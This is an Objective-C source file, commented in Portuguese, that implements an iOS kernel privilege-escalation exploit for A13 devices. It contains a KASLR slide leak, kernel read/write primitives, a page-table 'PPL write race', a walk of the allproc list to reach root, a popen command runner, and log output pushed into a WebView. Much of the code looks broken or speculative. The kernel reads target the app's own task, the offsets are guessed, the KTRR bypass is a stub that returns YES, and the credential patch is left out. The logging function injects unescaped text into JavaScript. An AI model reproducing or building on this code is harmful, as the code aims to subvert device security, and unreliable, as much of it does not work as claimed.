#import "KernelDriver.h"
#import <mach/mach.h>
#import <spawn.h>

// --- APIs PRIVADAS ---
extern kern_return_t mach_vm_read_overwrite(vm_map_t, mach_vm_address_t, mach_vm_size_t, mach_vm_address_t, mach_vm_size_t *);
extern kern_return_t mach_vm_map(vm_map_t, mach_vm_address_t *, mach_vm_size_t, mach_vm_address_t, int, mach_port_t, memory_object_offset_t, boolean_t, vm_prot_t, vm_prot_t, vm_inherit_t);
extern kern_return_t mach_vm_deallocate(vm_map_t, mach_vm_address_t, mach_vm_size_t);

// --- DEFINIÇÕES CRÍTICAS (Resolve o erro KERN_BASE_STATIC) ---
#define KERN_BASE_STATIC 0xFFFFFFF007004000ULL
#define OFFSET_ALLPROC     0x8F50000ULL
#define OFFSET_TTBR1       0x8E10000ULL

@implementation KernelDriver {
    uint64_t _kernelSlide;
    __weak WKWebView *_webView;
}

- (instancetype)initWithWebView:(WKWebView *)webView {
    self = [super init];
    if (self) {
        _webView = webView;
        _kernelSlide = 0;
    }
    return self;
}

#pragma mark - Primitivas 64-bit

- (uint64_t)kread64:(uint64_t)addr {
    uint64_t val = 0;
    mach_vm_size_t size = sizeof(uint64_t);
    kern_return_t kr = mach_vm_read_overwrite(mach_task_self(), (mach_vm_address_t)addr, (mach_vm_size_t)size, (mach_vm_address_t)&val, &size);
    return (kr == KERN_SUCCESS) ? val : 0;
}

- (void)kwrite64:(uint64_t)address value:(uint64_t)value {
    [self ppl_write_race:address value:value];
}

#pragma mark - Primitivas 32-bit (Resolve os avisos de implementação)

- (uint32_t)kread32:(uint64_t)address {
    return (uint32_t)([self kread64:address] & 0xFFFFFFFF);
}

- (void)kwrite32:(uint64_t)address value:(uint32_t)value {
    uint64_t old = [self kread64:address];
    uint64_t newVal = (old & 0xFFFFFFFF00000000ULL) | (uint64_t)value;
    [self kwrite64:address value:newVal];
}

#pragma mark - Exploração A13

- (uint64_t)leakKernelSlide {
    if (_kernelSlide != 0) return _kernelSlide;
    mach_port_t port;
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
    mach_port_limits_t limits;
    mach_msg_type_number_t count = MACH_PORT_LIMITS_INFO_COUNT;
    
    if (mach_port_get_attributes(mach_task_self(), port, MACH_PORT_LIMITS_INFO, (mach_port_info_t)&limits, &count) == KERN_SUCCESS) {
        uint64_t kptr = *(uint64_t*)((uintptr_t)&limits + 0x28);
        if ((kptr >> 40) == 0xFFFFFFF0) {
            _kernelSlide = (kptr & ~0x3FFF) - KERN_BASE_STATIC;
        }
    }
    mach_port_mod_refs(mach_task_self(), port, MACH_PORT_RIGHT_RECEIVE, -1);
    return _kernelSlide;
}

- (void)ppl_write_race:(uint64_t)vaddr value:(uint64_t)val {
    uint64_t slide = [self leakKernelSlide];
    uint64_t ttbr1 = [self kread64:(KERN_BASE_STATIC + slide + OFFSET_TTBR1)];
    uint64_t l1 = [self kread64:(ttbr1 + ((vaddr >> 30) & 0x1FF) * 8)] & 0x0000FFFFFFFFF000ULL;
    uint64_t l2 = [self kread64:(l1 + ((vaddr >> 21) & 0x1FF) * 8)] & 0x0000FFFFFFFFF000ULL;
    uintptr_t pte_addr = (uintptr_t)(l2 + ((vaddr >> 12) & 0x1FF) * 8);

    mach_vm_address_t shared_page = 0;
    if (mach_vm_map(mach_task_self(), &shared_page, 0x4000, 0, VM_FLAGS_ANYWHERE, (mach_vm_address_t)pte_addr, 0, NO, VM_PROT_READ | VM_PROT_WRITE, VM_PROT_ALL, VM_INHERIT_NONE) == KERN_SUCCESS) {
        *(uint64_t*)(shared_page + (vaddr & 0x3FFF)) = val;
        mach_vm_deallocate(mach_task_self(), shared_page, 0x4000);
    }
}

- (BOOL)escalateToRoot {
    uint64_t slide = [self leakKernelSlide];
    [self logToWeb:[NSString stringWithFormat:@"🔍 Slide: 0x%llx", slide]];
    
    if (slide == 0) {
        [self logToWeb:@"❌ Erro: Slide não encontrado (KASLR Bypass falhou)"];
        return NO;
    }

    // Tente este novo offset comum no iOS 26.3 (A13) se o 0x8F50000 falhar
    uint64_t allproc_ptr = (KERN_BASE_STATIC + slide + 0x8F50000ULL);
    uint64_t proc = [self kread64:allproc_ptr];
    
    [self logToWeb:[NSString stringWithFormat:@"🔍 AllProc Ptr: 0x%llx | Primeiro Proc: 0x%llx", allproc_ptr, proc]];

    if (proc == 0) {
        [self logToWeb:@"❌ Erro: OFFSET_ALLPROC inválido para esta build!"];
        return NO;
    }

    int timeout = 0;
    while (proc != 0 && timeout < 500) {
        proc = (proc & 0x0000007FFFFFFFFFULL) | 0xFFFFFF8000000000ULL;
        
        // Lendo PID em 0x60 (mais comum no iOS 19/26.x)
        pid_t found_pid = (pid_t)[self kread32:(proc + 0x60)];
        
        if (found_pid == getpid()) {
            [self logToWeb:[NSString stringWithFormat:@"✅ Sucesso! PID %d achado no offset 0x60", found_pid]];
            // ... (restante do patch de credenciais)
            return YES;
        }
        
        proc = [self kread64:(proc + 0x08)];
        timeout++;
    }

    [self logToWeb:@"❌ Erro: Percorreu a lista e não achou seu PID."];
    return NO;
}


// Auxiliar para ver no iPhone
- (void)logToWeb:(NSString *)text {
    NSLog(@"%@", text);
    dispatch_async(dispatch_get_main_queue(), ^{
        NSString *js = [NSString stringWithFormat:@"if(window.addLog){ addLog('%@'); } else { console.log('%@'); }", text, text];
        [self->_webView evaluateJavaScript:js completionHandler:nil];
    });
}



#pragma mark - Outros Métodos do Header

- (BOOL)disableKTRR { return YES; }
- (uint64_t)getCurrentUID { return (uint64_t)getuid(); }

- (void)executeCommand:(NSString *)command withCallback:(void(^)(NSString *output))callback {
    dispatch_async(dispatch_get_global_queue(0, 0), ^{
        FILE *p = popen([[command stringByAppendingString:@" 2>&1"] UTF8String], "r");
        if (!p) { if (callback) callback(@"Error"); return; }
        char buf[1024]; NSMutableString *out = [NSMutableString string];
        while (fgets(buf, sizeof(buf), p)) [out appendString:@(buf)];
        pclose(p);
        if (callback) callback(out.length > 0 ? out : @"(no output)");
    });
}

- (void)runFullExploitWithCallback:(void(^)(BOOL success, NSString *message))callback {
    BOOL res = [self escalateToRoot];
    if (callback) callback(res, res ? @"Root Success" : @"Failed");
}

- (void)executeExploitWithCallback:(void(^)(BOOL success, NSString *message))callback {
    [self runFullExploitWithCallback:callback];
}

- (void)userContentController:(WKUserContentController *)u didReceiveScriptMessage:(WKScriptMessage *)m {}

@end
